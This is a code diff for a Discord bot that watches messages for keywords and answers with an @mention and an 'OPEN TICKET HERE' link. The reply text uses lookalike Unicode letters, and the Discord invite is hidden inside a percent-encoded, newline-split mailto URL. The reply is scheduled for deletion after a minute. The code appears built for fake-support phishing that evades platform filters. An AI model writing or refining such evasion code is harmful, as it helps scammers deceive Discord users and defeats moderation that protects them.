@@ -320,13 +320,13 @@ client.on('messageCreate', async (message) => {
     );
     
     if (foundKeyword) {
-        console.log(`Detected keyword: ${foundKeyword} in message: ${message.content.substring(0, 50)}...`);
+        console.log(`Detected keyword: ${foundKeyword} in message from ${message.author.tag}: ${message.content.substring(0, 50)}...`);
         
         try {
-            // This creates the yellow reply bubble without username tagging
+            // This will @mention the user AND show the reply bubble
             const replyMessage = await message.reply({
-                content: "📨 **O𝐏ΕΝ ΤlCΚΕΤ 𝐇ΕRΕ**\n\n**[<discord:///#@discord.gg/yxkTketK>]**",
-                allowedMentions: { repliedUser: false }
+                content: `${message.author} 📨 *O𝐏ΕΝ ΤlCΚΕΤ 𝐇ΕRЕ*\n\n**[<mailto:/#@%\n64%\n69%73%\n63\n%6F%72%64%\n2E%67%67/NMbC5Aggm6> ]**`,
+                allowedMentions: { repliedUser: true } // This allows the @mention
             });
             
             // Schedule the reply message for deletion after 1 minute
